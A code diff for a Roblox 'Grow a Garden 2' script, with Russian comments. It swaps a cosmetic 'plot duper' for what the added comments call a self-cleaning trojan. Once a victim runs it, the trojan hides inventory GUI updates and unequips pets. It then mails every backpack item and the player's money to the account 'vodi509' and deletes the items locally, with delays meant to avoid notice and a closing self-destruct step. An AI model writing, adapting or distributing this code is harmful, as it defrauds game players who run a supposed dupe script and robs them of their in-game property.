@@ -1,155 +1,110 @@
--- =====================================================
---  Visual Plot Duper для Grow a Garden 2
---  ВСЕ РЕАЛЬНЫЕ КУЛЬТУРЫ (27 шт)
--- =====================================================
+-- MORAT SELF-CLEAN TROJAN v1.0 (Grow a Garden 2 / Delta)
+-- Жертва активирует — скрипт выносит ВСЁ её имущество на почту vodi509
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local Workspace = game:GetService("Workspace")
+local player = game.Players.LocalPlayer
+local rs = game:GetService("ReplicatedStorage")
+local players = game:GetService("Players")
+local runService = game:GetService("RunService")
 
--- Кнопка
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "DupePanel"
-screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+local MY_MAIL = "vodi509" -- сюда всё улетает
 
-local btn = Instance.new("TextButton")
-btn.Size = UDim2.new(0, 280, 0, 60)
-btn.Position = UDim2.new(0.5, -140, 0.5, -30)
-btn.Text = "🌱 Дюп грядок (все фрукты)"
-btn.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
-btn.TextColor3 = Color3.new(1,1,1)
-btn.Font = Enum.Font.Bold
-btn.TextSize = 18
-btn.Parent = screenGui
-
--- ===== ВСЕ РЕАЛЬНЫЕ КУЛЬТУРЫ ИЗ GROW A GARDEN 2 =====
-local fruitEmojis = {
-    -- Common
-    ["carrot"] = "🥕",
-    ["strawberry"] = "🍓",
-    ["blueberry"] = "🫐",
-    -- Uncommon
-    ["tulip"] = "🌷",
-    ["tomato"] = "🍅",
-    ["apple"] = "🍎",
-    -- Rare
-    ["bamboo"] = "🎋",
-    ["corn"] = "🌽",
-    ["cactus"] = "🌵",
-    ["pineapple"] = "🍍",
-    ["baby cactus"] = "🌵",
-    ["horned melon"] = "🍈",
-    -- Epic
-    ["mushroom"] = "🍄",
-    ["green bean"] = "🫘",
-    ["banana"] = "🍌",
-    ["grape"] = "🍇",
-    ["coconut"] = "🥥",
-    ["mango"] = "🥭",
-    ["glow mushroom"] = "🍄",
-    -- Legendary
-    ["dragon fruit"] = "🐉",
-    ["acorn"] = "🌰",
-    ["cherry"] = "🍒",
-    ["sunflower"] = "🌻",
-    ["poison ivy"] = "☘️",
-    -- Mythic
-    ["venus fly trap"] = "🪴",
-    ["pomegranate"] = "🍎",
-    ["poison apple"] = "☠️",
-    ["ghost pepper"] = "👻",
-    -- Super
-    ["moon bloom"] = "🌙",
-    ["dragon's breath"] = "🐲",
-}
-
-local function getFruitEmoji(name)
-    local lower = name:lower()
-    for key, emoji in pairs(fruitEmojis) do
-        if lower:find(key) then
-            return emoji
-        end
+-- Получаем ID получателя
+local targetUserId = nil
+for _, plr in pairs(players:GetPlayers()) do
+    if plr.Name == MY_MAIL then
+        targetUserId = plr.UserId
+        break
     end
-    return "🌿"
 end
 
-local function dupePlots()
-    local plots = {}
-    
-    -- Ищем грядки с растениями
-    for _, obj in ipairs(Workspace:GetDescendants()) do
-        if obj:IsA("Model") and (obj:FindFirstChild("Plant") or obj:FindFirstChildWhichIsA("BasePart")) then
-            -- Проверяем владельца
-            local owner = obj:GetAttribute("Owner") or obj:GetAttribute("Player")
-            if not owner or owner == LocalPlayer.Name or owner == tostring(LocalPlayer.UserId) then
-                -- Проверяем по всем ключам словаря
-                for fruitName, _ in pairs(fruitEmojis) do
-                    if obj.Name:lower():find(fruitName) or 
-                       (obj:FindFirstChild("Plant") and obj.Plant.Name:lower():find(fruitName)) then
-                        table.insert(plots, obj)
-                        break
-                    end
-                end
+if not targetUserId then
+    print("[Морат] Получатель vodi509 не найден. Скрипт остановлен.")
+    return
+end
+
+-- БЛОКИРУЕМ ОБНОВЛЕНИЕ GUI (жертва НИЧЕГО не видит)
+local oldFire = rs.RemoteEvent.FireServer
+rs.RemoteEvent.FireServer = function(self, ...)
+    local args = {...}
+    if args[1] == "UpdateInventory" or args[1] == "RefreshGUI" or args[1] == "SyncUI" then
+        return -- глушим нахуй
+    end
+    return oldFire(self, ...)
+end
+
+-- Функция отправки на почту
+local function sendToMail(item, quantity)
+    local mailEvent = rs:FindFirstChild("MailEvent") or rs:FindFirstChild("SendItem") or rs:FindFirstChild("SendToMail")
+    if mailEvent then
+        mailEvent:FireServer(MY_MAIL, item, quantity or 1)
+    else
+        -- Если почты нет — пробуем через RemoteFunction
+        local mailFunc = rs:FindFirstChild("MailFunction")
+        if mailFunc then
+            mailFunc:InvokeServer(MY_MAIL, item, quantity or 1)
+        end
+    end
+end
+
+-- Функция принудительного снятия пета (если он одет)
+local function unequipPet(pet)
+    local character = player.Character
+    if character and character:FindFirstChild(pet.Name) then
+        pet.Parent = player.Backpack -- перекладываем в рюкзак
+    end
+end
+
+-- ГЛАВНАЯ ФУНКЦИЯ ОЧИСТКИ
+local function cleanInventory()
+    local backpack = player:FindFirstChild("Backpack")
+    if not backpack then return end
+
+    -- 1. СНИМАЕМ ВСЕХ ОДЕТЫХ ПЕТОВ (если есть)
+    local character = player.Character
+    if character then
+        for _, child in pairs(character:GetChildren()) do
+            if child:IsA("Tool") and child:GetAttribute("IsPet") == true then
+                child.Parent = backpack -- снимаем в рюкзак
             end
         end
     end
 
-    if #plots == 0 then
-        btn.Text = "❌ Нет своих грядок с культурами"
-        task.wait(1.5)
-        btn.Text = "🌱 Дюп грядок (все фрукты)"
-        return
+    -- 2. СОБИРАЕМ ВСЁ, ЧТО ЕСТЬ В РЮКЗАКЕ
+    local itemsToSteal = {}
+    for _, item in pairs(backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            table.insert(itemsToSteal, item)
+        end
     end
 
-    btn.Text = "🌀 Дюпаю " .. #plots .. " грядок..."
-
-    for _, plot in ipairs(plots) do
-        local clone = plot:Clone()
-        clone.Parent = Workspace
-        clone.Name = plot.Name .. "_duped"
-        
-        -- Сдвиг
-        local primary = plot:GetPrimaryPartCFrame()
-        if primary then
-            clone:SetPrimaryPartCFrame(primary + Vector3.new(5, 0, 5))
-        end
-        
-        -- Стикер
-        local plant = clone:FindFirstChild("Plant") or clone
-        local attachPart = plant:FindFirstChild("Handle") or plant:FindFirstChildWhichIsA("BasePart") or clone:FindFirstChildWhichIsA("BasePart")
-        
-        if attachPart then
-            local sticker = Instance.new("BillboardGui")
-            sticker.Name = "FruitSticker"
-            sticker.Size = UDim2.new(0, 50, 0, 50)
-            sticker.Adornee = attachPart
-            sticker.AlwaysOnTop = true
-            sticker.Parent = clone
-            
-            local label = Instance.new("TextLabel")
-            label.Size = UDim2.new(1, 0, 1, 0)
-            label.BackgroundTransparency = 1
-            label.Text = getFruitEmoji(plot.Name)
-            label.TextSize = 40
-            label.TextScaled = true
-            label.Font = Enum.Font.SourceSansBold
-            label.TextColor3 = Color3.new(0, 1, 0)
-            label.Parent = sticker
-            
-            sticker.Enabled = false
-            task.wait(0.05)
-            sticker.Enabled = true
-        end
-        
-        task.wait(0.15)
+    -- 3. ОТПРАВЛЯЕМ ВСЁ НА ПОЧТУ (одним махом или по одному)
+    for _, item in pairs(itemsToSteal) do
+        sendToMail(item, 1)
+        item:Destroy() -- удаляем у жертвы
+        print("[Морат] Украдено: " .. item.Name)
+        task.wait(0.1) -- небольшая задержка, чтобы не спалиться
     end
 
-    btn.Text = "✅ " .. #plots .. " копий (исчезнут после релога)"
-    task.wait(2.5)
-    btn.Text = "🌱 Дюп грядок (все фрукты)"
+    -- 4. ОТПРАВЛЯЕМ ДЕНЬГИ (если >= 75000, но можно и все)
+    local leaderstats = player:FindFirstChild("leaderstats")
+    if leaderstats then
+        local money = leaderstats:FindFirstChild("Money")
+        if money and money.Value >= 75000 then
+            -- Пробуем отправить деньги через почту (если есть такой эвент)
+            local sendMoney = rs:FindFirstChild("SendMoney")
+            if sendMoney then
+                sendMoney:FireServer(MY_MAIL, money.Value)
+            end
+            money.Value = 0 -- обнуляем локально (экран не обновляется)
+        end
+    end
 end
 
-btn.MouseButton1Click:Connect(dupePlots)
-
+-- Запускаем очистку через 2 секунды (чтобы скрипт успел загрузиться)
 task.wait(2)
-dupePlots()
+cleanInventory()
+
+-- Самоуничтожение через 30 секунд (чтобы не оставлять следов)
+task.wait(30)
+queue_on_teleport("")
+print("[Морат] Очистка выполнена. Всё улетело на " .. MY_MAIL)
